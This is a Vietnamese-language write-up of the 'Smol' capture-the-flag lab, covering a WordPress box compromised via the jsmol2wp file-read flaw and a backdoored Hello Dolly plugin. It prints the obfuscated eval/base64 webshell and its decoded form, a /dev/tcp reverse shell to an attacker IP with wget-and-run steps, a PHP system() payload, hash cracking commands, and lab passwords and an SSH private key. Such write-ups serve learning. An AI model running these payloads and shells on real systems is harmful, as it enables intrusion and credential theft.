---
tags:
  - ctf
  - learning
  - boot-to-root
title: Smol
post-date: 04-03-2025
category: lab
---
# Enumeration
- Lo hong plugin
- Software update
- Backdoor plugin
## Scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 (99%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 5.0 - 5.14 (94%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Android 10 - 12 (Linux 4.14 - 4.19) (93%)
No exact OS matches for host (test conditions non-ideal).

```
## Dirsearch 
```bash
Target: http://www.smol.thm/

[08:44:32] Starting: 
[08:44:44] 403 -  277B  - /.ht_wsr.txt
[08:44:44] 403 -  277B  - /.htaccess.bak1
[08:44:44] 403 -  277B  - /.htaccessOLD
[08:44:44] 403 -  277B  - /.htaccess.orig
[08:44:44] 403 -  277B  - /.htaccess_orig
[08:44:44] 403 -  277B  - /.htaccess_extra
[08:44:44] 403 -  277B  - /.htaccessOLD2
[08:44:44] 403 -  277B  - /.htaccess_sc
[08:44:44] 403 -  277B  - /.htaccess.save
[08:44:44] 403 -  277B  - /.htm
[08:44:44] 403 -  277B  - /.htaccess.sample
[08:44:44] 403 -  277B  - /.htaccessBAK
[08:44:44] 403 -  277B  - /.html
[08:44:45] 403 -  277B  - /.htpasswd_test
[08:44:45] 403 -  277B  - /.httr-oauth
[08:44:45] 403 -  277B  - /.htpasswds
[08:44:48] 403 -  277B  - /.php
[08:45:44] 301 -    0B  - /index.php  ->  http://www.smol.thm/
[08:45:45] 404 -   44KB - /index.php/login/
[08:45:48] 200 -    7KB - /license.txt
[08:46:07] 200 -    3KB - /readme.html
[08:46:11] 403 -  277B  - /server-status
[08:46:11] 403 -  277B  - /server-status/
[08:46:29] 301 -  315B  - /wp-admin  ->  http://www.smol.thm/wp-admin/
[08:46:29] 400 -    1B  - /wp-admin/admin-ajax.php
[08:46:29] 409 -    3KB - /wp-admin/setup-config.php
[08:46:29] 200 -    0B  - /wp-config.php
[08:46:29] 200 -  500B  - /wp-admin/install.php
[08:46:29] 302 -    0B  - /wp-admin/  ->  http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Fwp-admin%2F&reauth=1
[08:46:29] 301 -  317B  - /wp-content  ->  http://www.smol.thm/wp-content/
[08:46:29] 200 -    0B  - /wp-content/
[08:46:30] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
[08:46:30] 500 -    0B  - /wp-content/plugins/hello.php
[08:46:30] 200 -  414B  - /wp-content/upgrade/
[08:46:30] 200 -  530B  - /wp-content/uploads/
[08:46:30] 301 -  318B  - /wp-includes  ->  http://www.smol.thm/wp-includes/
[08:46:30] 200 -    0B  - /wp-includes/rss-functions.php
[08:46:30] 200 -    0B  - /wp-cron.php
[08:46:30] 200 -    4KB - /wp-includes/
[08:46:30] 200 -    2KB - /wp-login.php
[08:46:30] 302 -    0B  - /wp-signup.php  ->  http://www.smol.thm/wp-login.php?action=register
[08:46:31] 405 -   42B  - /xmlrpc.php
```
## Vhost/Subdomain
```bash
.htaccessmNvyamuA       [Status: 200, Size: 61505, Words: 2124, Lines: 402, Duration: 313ms]
WWW                     [Status: 200, Size: 61505, Words: 2124, Lines: 402, Duration: 312ms]
```
## Wappalyzer

| Technology         | Version |
| ------------------ | ------- |
| PHP                |         |
| MySQL              |         |
| WordPress          | 6.7.1   |
| Apache HTTP Server | 2.4.41  |
## WPScan
```bash
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 | Readme: http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

```
## Additions
Email: admin@smol.thm
Private IP (?):
![[Pasted image 20250304090936.png]]
Search parameter: http://www.smol.thm/?s=
Plugins: buddypress, wysija, akismet, emoji setting
# Exploitation
## jsmol2wp
Voi `CVE-2018-20463` ta co the doc duoc `/etc/passwd`:
```bash
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```
Ngoai ra ta cung tim dc MySQL credential:
```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

```bash
curl -X POST -d '<?php system($_GET["cmd"]); ?>' "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource="
```
Thu credential cua MySQL cho WP, ta vao dc ...
![[Pasted image 20250304171335.png]]
Tim thu mo 1 luc ta thay page o private:
![[Pasted image 20250304171422.png]]
Nhin vao phan 1, ta thu kiem tra hello dolly source code nam o dau. Cam on ChatGPT:
![[Pasted image 20250304171615.png]]
![[Pasted image 20250304171730.png]]
Ta thay co mot doan code kha ky la :
```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```
Va bruh :))
![[Pasted image 20250304171908.png]]
Doan ma tren dc decode nhu sau:
```php
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```
Trong do `\143\155\x64` va `\143\x6d\144` la ma hoa UTF-8 ASCII cua `cmd`
Tim hieu ky hon ve doan backdoor o tren, `add_action` la mot ham trong WP dung de **dang ky mot ham xu ly vao mot "hook" cu the**. Khi WP chay den hook nao, tat ca cac ham duoc dang ky se thuc thi. Hook `admin_notices` duoc chay moi khi trang admin panel duoc tai. Vi vay ham `hello_dolly` se chi dc chay khi o trang admin panel. Do do ta can them parameter vao URL goi admin panel
```bash
http://www.smol.thm/wp-admin/?cmd=ls
```
![[Pasted image 20250304174625.png]]
Oke gio thi ta se tim mot reverse shell:
```bash
# reverse.sh

#!/bin.bash
sh -i >& /dev/tcp/10.8.16.212/8000 0>&1
```
Mo simplehttpserver:
```bash
python3 -m http.server 80
```
Thuc hien them vai buoc don gian de kich hoat:
```url
http://www.smol.thm/wp-admin/index.php?cmd=wget http://[socket]/reverse.sh
```

```url
http://www.smol.thm/wp-admin/index.php?cmd=chmod 777 reverse.sh
```

```url
http://www.smol.thm/wp-admin/index.php?cmd=bash reverse.sh
```
## Privilege Escalation
Truoc tien ta can `TTY Spawn`: ```python3
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
Ta thu login MySQL voi credential da co:
```bash
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
```

```bash
$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```
Ta dung `John` co duoc: `sandiegocalifornia` -> Du doan day la pass cua `diego`.
Ta thu va thanh cong co co flag dau `user`.
```bash
diego@smol:~$ ls
ls
user.txt
```
Ta luc qua user `think`, ta co private key cua `ssh`:
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Sau khi vao dc voi credential cua `think`, ta co the nhay sang tiep `gege` chi don gian voi `su gege`.
Den day ta co the thu unzip `wordpress.old.zip`:
![[Pasted image 20250305002513.png]]
Buon thay cac mat khau cu khong dung lai dc. Vi vay ta chuyen sang cac crack pass nay bang cach chuyen no ve may attacker roi dung `hashcat` de crack:
- Dau tien ta dung `zip2john` de chuyen file ve chuan ma `hashcat` co the doc:
```bash
zip2john wordpress.old.zip > wordpress.txt
```

```bash
# wordpress.txt

wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
```
- Loc cac phan thua ta con:
```bash
# wordpress.txt

$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$
```
- Dung `hashcat` de crack:
```bash
hashcat -m 17225 -a 0 wordpress.txt /usr/share/wordlists/rockyou.txt --force -O
```
Giai nen xong ta lai tim toi `wp-config.php` va ta co:
```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```
Dang nhap `xavi` voi credential moi va thu `sudo -l`:
```bash
xavi@smol:/home/gege$ sudo -l
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```
Voi permission nhu the nay thi ta co the `sudo su` va tro choi ket thuc:
```bash
root@smol:/home/gege$ 
```